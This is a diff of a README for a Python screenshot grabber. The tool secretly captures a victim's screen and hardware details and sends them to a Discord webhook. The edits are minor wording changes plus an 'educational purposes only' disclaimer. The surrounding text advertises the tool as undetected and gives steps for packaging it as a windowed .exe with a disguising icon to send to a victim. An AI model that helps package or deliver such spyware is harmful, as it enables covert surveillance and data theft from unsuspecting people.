@@ -10,7 +10,7 @@ A simple Screenshot Grabber for Discord Webhook written in Python. 📸
 - ✅ Shows **Screenshot and Hardware info** directly in the webhook
 - ✅ Completly undetected
 - ✅ Simple to use
-- 📍 After config you have to convert the python file to .exe manually with `auto-py-to-exe`
+- 📍 After config you have to convert the python file to .exe manually with `auto-py-to-exe` (Tutorial below)
 ## 📸 Webhook preview
 
 ![App Screenshot](https://i.ibb.co/DfS7TM3/image.png)
@@ -53,6 +53,8 @@ auto-py-to-exe
 - Select **Hide the console** (--windowed)
 - Select **an icon** (must be .ICO) (--icon)
 - In advanced input .exe **file name** (--name)
-- Hit the Convert Button! THATS ALL
+- Hit the Convert Button! THAT'S ALL
 
 You should get an **executable file (.exe)** that you can send to the victim. ✅
+#
+For educational purposes only! ⛔
